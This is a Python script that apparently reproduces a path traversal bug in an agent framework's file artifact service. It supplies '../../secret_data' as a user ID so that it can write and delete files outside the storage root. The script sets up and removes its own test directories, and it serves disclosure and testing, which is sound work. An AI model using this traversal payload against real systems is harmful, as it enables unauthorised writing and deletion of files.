
import asyncio
import os
import shutil
from pathlib import Path
from google.adk.artifacts.file_artifact_service import FileArtifactService
from google.genai import types

async def reproduce_path_traversal():
    # Setup a temporary artifact directory
    test_root = Path("test_artifacts_root").resolve()
    if test_root.exists():
        shutil.rmtree(test_root)
    test_root.mkdir()

    # Create a "secret" file outside the root
    secret_dir = Path("secret_data").resolve()
    if secret_dir.exists():
        shutil.rmtree(secret_dir)
    secret_dir.mkdir()
    secret_file = secret_dir / "passwords.txt"
    secret_file.write_text("SUPER_SECRET_PASSWORD")

    service = FileArtifactService(root_dir=test_root)

    # Attempt to use path traversal in user_id to point the scope root to secret_dir
    # _base_root = root_dir / "users" / user_id
    # If user_id = "../../secret_data", then _base_root = test_root / "users" / "../../secret_data" = secret_dir
    # _scope_root = _base_root / "artifacts" = secret_dir / "artifacts"
    
    # We need to make it point exactly where we want.
    # Actually, _user_artifacts_dir adds "artifacts" suffix.
    # So we might need to point it to a place where we can then use artifact_name to traverse.
    
    # Wait, if I set user_id to "../../", base_root is test_root.
    # scope_root is test_root / "artifacts".
    # This doesn't seem to help much for escaping test_root if artifact_name is checked.
    
    # BUT, what if I set user_id to "../../secret_data"?
    # base_root = secret_dir
    # scope_root = secret_dir / "artifacts"
    
    # If I then save an artifact with filename="passwords.txt", it will be saved under secret_dir/artifacts/passwords.txt/versions/0/passwords.txt
    
    # What if I want to READ an existing file?
    # I need to trick it into thinking a file exists.
    
    # The artifact service expects a specific structure: {artifact_dir}/versions/{version}/{filename}
    # So it's not a direct "read any file" vulnerability, but a "read/write files anywhere on disk" vulnerability
    # (subject to the structure it creates).
    
    print(f"Test root: {test_root}")
    print(f"Secret dir: {secret_dir}")

    traversal_user_id = "../../secret_data"
    filename = "stolen_secret"
    
    # Try to save an artifact into the secret directory
    print(f"Attempting to save artifact with user_id='{traversal_user_id}'...")
    try:
        await service.save_artifact(
            app_name="test_app",
            user_id=traversal_user_id,
            filename=filename,
            artifact=types.Part(text="I AM IN YOUR SECRETS")
        )
        
        expected_path = secret_dir / "artifacts" / filename / "versions" / "0" / filename
        if expected_path.exists():
            print(f"SUCCESS: Artifact saved to {expected_path}")
            print(f"Content: {expected_path.read_text()}")
        else:
            print(f"FAILURE: Artifact not found at {expected_path}")
            # Check where it actually went
            for p in secret_dir.rglob("*"):
                print(f"Found on disk: {p}")

    except Exception as e:
        print(f"Error during save: {e}")

    # Now try to delete it
    print(f"\nAttempting to delete artifact with user_id='{traversal_user_id}'...")
    try:
        await service.delete_artifact(
            app_name="test_app",
            user_id=traversal_user_id,
            filename=filename
        )
        if not expected_path.exists():
            print("SUCCESS: Artifact deleted from secret directory")
        else:
            print("FAILURE: Artifact still exists")
    except Exception as e:
        print(f"Error during delete: {e}")

    # Cleanup
    if test_root.exists():
        shutil.rmtree(test_root)
    if secret_dir.exists():
        shutil.rmtree(secret_dir)

if __name__ == "__main__":
    asyncio.run(reproduce_path_traversal())
